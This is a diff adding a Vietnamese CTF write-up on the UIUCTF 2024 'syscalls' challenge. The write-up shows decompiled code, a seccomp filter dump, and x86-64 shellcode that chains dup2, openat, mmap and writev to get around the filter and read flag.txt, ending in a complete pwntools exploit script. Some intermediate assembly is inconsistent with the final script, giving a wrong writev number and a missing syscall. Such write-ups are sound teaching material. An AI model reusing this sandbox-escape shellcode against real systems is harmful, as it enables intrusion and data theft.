@@ -832,3 +832,292 @@ p.interactive()
 ![flag](/assets/images/flaghehe.png)
 
 ref : [here](https://orcinus-orca.tistory.com/248) and [here](https://orcinus-orca.tistory.com/248) , [here](https://www.ired.team/offensive-security/code-injection-process-injection/writing-custom-shellcode-encoders-and-decoders#raw-shellcode)
+
+
+## syscall
+
+- ta sẽ được input 176 bytes vào ```a1```
+
+```c
+char *__fastcall sub_1280(char *a1)
+{
+  puts(
+    "The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.");
+  return fgets(a1, 176, stdin);
+}
+```
+
+- nhìn thấy ```prctl``` nên ta sẽ check ```seccomp-tools``` 
+
+```c
+__int64 __fastcall sub_12DB(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
+{
+  int v7; // [rsp+0h] [rbp-F0h]
+  __int64 v8; // [rsp+10h] [rbp-E0h] BYREF
+  _QWORD v9[26]; // [rsp+20h] [rbp-D0h] BYREF
+
+  v9[25] = __readfsqword(0x28u);
+  v9[0] = 0x400000020LL;
+  v9[1] = 0xC000003E16000015LL;
+  v9[2] = 32LL;
+  v9[3] = 0x4000000001000035LL;
+  v9[4] = -3976200171LL;
+  v9[5] = 1179669LL;
+  v9[6] = 0x100110015LL;
+  v9[7] = 0x200100015LL;
+  v9[8] = 0x11000F0015LL;
+  v9[9] = 0x13000E0015LL;
+  v9[10] = 0x28000D0015LL;
+  v9[11] = 0x39000C0015LL;
+  v9[12] = 0x3B000B0015LL;
+  v9[13] = 0x113000A0015LL;
+  v9[14] = 0x12700090015LL;
+  v9[15] = 0x12800080015LL;
+  v9[16] = 0x14200070015LL;
+  v9[17] = 0x1405000015LL;
+  v9[18] = 0x1400000020LL;
+  v9[19] = 196645LL;
+  v9[20] = 50331669LL;
+  v9[21] = 0x1000000020LL;
+  v9[22] = 0x3E801000025LL;
+  v9[23] = 0x7FFF000000000006LL;
+  v9[24] = 6LL;
+  v7 = 200;
+  LOWORD(v8) = 25;
+  prctl(38, 1LL, 0LL, 0LL, 0LL, a6, v7, v9, v8, v9);
+  return (unsigned int)prctl(22, 2LL, &v8);
+}
+```
+
+- ta sẽ không thể gọi ```shell``` vì ở đây nó cấm ```execve``` và ```execveat``` rồi , ta cũng không thể ```read``` hay ```readv``` hay ```preadv``` ... tuy nhiên nó lại cho phép ta dùng ```writev``` , tuy nhiên nó sẽ check ```fd``` , ```fd``` của ta phải >= 0x3e8
+
+```cs
+ploi@PhuocLoiiiii:~/pwn/shellcode/UIUCTF 24$ seccomp-tools dump ./syscalls
+The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.
+a
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
+ 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
+ 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
+ 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
+ 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
+ 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
+ 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
+ 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
+ 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
+ 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
+ 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
+ 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
+ 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
+ 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
+ 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
+ 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
+ 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
+ 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
+ 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
+ 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0024: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+- cuối cùng là nó sẽ thực thi shellcode của ta
+
+```c
+call_shellcode((__int64 (*)(void))v8);
+```
+
+- ở bài này nó không filter ```openat``` nên ta có thể dùng ```openat``` thay cho ```open``` , ta sẽ sử dụng ```mmap``` để thay thế ```read``` , ```pread64``` ....  
+
+- trước hết ta sẽ chuyển fd của nó sang 1 fd được cho phép , ta chỉ cần sử dụng ```dup2``` ở trường hợp này :
+
+syscall của nó là 	0x21 , oldfd sẽ là 1 và newfd là 1 số >= 0x3e80x3e8
+```cs
+unsigned int oldfd, unsigned int newfd
+```
+
+đơn giản là như sau :
+
+
+```cs
+mov rax,0x21
+mov rdi,1
+mov rsi,0x3e9
+syscall
+```
+
+- tiếp theo sẽ là openat : 
+
+nếu filename là đường dẫn tuyệt đối thì ```dfd``` sẽ bị bỏ qua , còn tương đối thì nó sẽ là -100 , flags và mode ta sẽ để là 0 
+
+```cs
+	int dfd, const char *filename, int flags, umode_t mode
+```
+
+nó sẽ trông như sau : 
+
+```c
+mov rax,0x101  // syscall number
+mov rdx,29816  // setup tx
+push rdx
+movabs rsi,8371742425456455470 // ./flag.t little endian
+push rsi
+xor rdx,rdx
+xor rsi,rsi
+mov rdi,-100  //dfd
+mov rsi,rsp  // path 
+syscall
+```
+
+- tiếp theo là ```mmap``` 
+
+address ta sẽ setup là null , rsi sẽ là số byte cần đọc từ flag.txt , rdx : prot sẽ là 1 (PROT_READ) , r10 : flag là 2 (MAP_PRITVATE) , r8 là fd (được setup bởi dup2) , r9 là offset ta sẽ để là 0
+
+```cs
+// rdi,rsi,rdx,r10,r8,r9
+unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off
+```
+
+- nó sẽ như sau:
+```cs
+mov rax,9
+mov rsi,0x100
+mov rdi,0
+mov rdx,1
+mov r10,2
+mov r8,0x3e9
+mov r9,0
+syscall
+```
+
+- cuối cùng là ```writev``` 
+
+
+```cs
+unsigned long fd, const struct iovec *vec, unsigned long vlen
+```
+
+giải thích cái ```struct``` 
+
+![here](/assets/images/writev.png)
+
+- vậy nó sẽ trông như sau : 
+
+```cs
+mov rsi,rax // rax chứa buffer trả về 
+mov r9,0x100  // iov_len
+push r9
+push rsi
+mov rdx,1 // 1 struct
+mov rdi,0x3e9 // fd
+mov rsi,rsp
+mov rax,0x20 //syscall number
+```
+
+- ghép tất cả lại =)))
+
+```cs
+//dup2
+mov rax,0x21
+mov rdi,1
+mov rsi,0x3e9
+syscall
+
+//openatopenat
+mov rax,0x101  // syscall number
+mov rdx,29816  // setup tx
+push rdx
+movabs rsi,8371742425456455470 // ./flag.t little endian
+push rsi
+xor rdx,rdx
+xor rsi,rsi
+mov rdi,-100  //dfd
+mov rsi,rsp  // path 
+syscall
+
+//mmap
+mov rax,9
+mov rsi,0x100
+mov rdi,0
+mov rdx,1
+mov r10,2
+mov r8,0x3e9
+mov r9,0
+syscall
+
+//writev
+mov rsi,rax // rax chứa buffer trả về 
+mov r9,0x100  // iov_len
+push r9
+push rsi
+mov rdx,1 // 1 struct
+mov rdi,0x3e9 // fd
+mov rsi,rsp
+mov rax,0x20 //syscall number
+```
+
+
+exp : 
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./syscalls")
+
+context.binary = exe
+
+p = process()
+gdb.attach(p,gdbscript='''
+           brva 0x00000000000012D6
+           ''')
+
+sc = asm('''
+        mov rax,0x21
+        mov rdi,1
+        mov rsi,0x3e9
+        syscall
+
+        mov rax,0x101
+        mov rdx,29816
+        push rdx
+        movabs rsi,8371742425456455470
+        push rsi
+        xor rdx,rdx
+        xor rsi,rsi
+        mov rdi,-100
+        mov rsi,rsp
+        syscall
+
+        mov r8,rax
+        mov rax,9
+        mov rsi,0x100
+        mov rdi,0
+        mov rdx,1
+        mov r10,2
+        mov r9,0
+        syscall
+
+        mov r10,rax
+        mov r9,0x100
+        push r9
+        push r10
+        mov rdx,1
+        mov rdi,0x3e9
+        mov rsi,rsp
+        mov rax,0x14
+        syscall
+         ''')
+input()
+p.sendline(sc)
+p.interactive()
+```
+
+lụm =)) 
+![lum=))](/assets/images/lum.png)
+
+ref : ![ref](https://ctftime.org/writeup/39292)
